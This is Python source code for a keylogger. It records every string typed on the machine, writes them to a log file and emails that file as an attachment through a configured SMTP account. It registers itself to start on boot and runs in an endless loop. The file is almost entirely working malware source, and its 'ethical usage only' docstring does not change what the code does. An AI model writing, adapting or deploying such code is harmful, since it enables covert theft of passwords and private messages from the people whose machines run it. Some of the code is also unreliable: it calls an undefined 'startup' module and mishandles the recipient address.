#!/bin/usr/python
# -*- coding: utf-8 -*-

import threading
import os
import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from time import sleep
import settings  # change to advanced_keylogger.settings
import registry  # change to advanced_keyloger.registry
import socket


class KeyLogger:

    """
        This is a Keylogger that sends data back to a specified email\n
        The use is subjected to ethical usage only
    """

    def __init__(self):

        if settings.CLEAR_ON_STARTUP:

            os.remove(settings.FILE_PATH)

        self.__create_log_file()

        # creates a new thread to run keylogger

        keylogger_thread = threading.Thread(target=self.__listener)

        keylogger_thread.start()

        if self.check_for_internet():

            # creates new thread to send email

            mail_thread = threading.Thread(target=self.__sendmail)

            mail_thread.start()

        keylogger_thread.join()

        if self.check_for_internet():

            mail_thread.join()

    def __create_log_file(self):
        """
        creates the file where the logged keys should be saved using settings.py
        """


        if not os.path.isfile(settings.FILE_PATH):

            with open(settings.FILE_PATH, 'w+') as file:

                file.write("")

                file.close()


    def check_for_internet(self):
        
        """

        checks if there is internet

        """

        ipaddress = socket.gethostbyname(socket.gethostname())

        if ipaddress == '127.0.0.1':

            return False

        return True

    
    def __listener(self):
        """

            Listens to key presses and save to the file specified in settings.py

        """


        output_file = open(settings.FILE_PATH, 'a')

        for key in keyboard.get_typed_strings(keyboard.record(settings.TERMINATE_KEY)):
            output_file.write(key+" \n")
    

    def __sendmail(self):
        
        """

        sends the file to the specified email in settings.py

         """

        sleep(settings.FREQUENCY)

        message = MIMEMultipart()

        message['subject'] = settings.SUBJECT

        message['from'] = settings.EMAIL
        
        message['to'] = ', '.join(settings.EMAIL)

        part = MIMEBase('application', 'octet-stream')

        with open(settings.FILE_PATH, 'rb') as file:

            part.set_payload(file.read())

        encoders.encode_base64(part)

        part.add_header('Content-Disposition', 'attachment: filename="%s"' % settings.FILE_NAME)

        message.attach(part)

        mail_server = smtplib.SMTP(settings.SMTP_SERVER, settings.SMTP_PORT)

        mail_server.ehlo()

        mail_server.starttls()

        mail_server.login(settings.EMAIL, settings.PASSWORD)

        mail_server.sendmail(settings.EMAIL, settings.EMAIL, message.as_string())

        mail_server.close()


if __name__ == "__main__":

    # add the exe file to registry for automatic startup on boot

    startup.AddToRegistry()

    # Runs the key logger Forever!

    while True:

        KeyLogger()
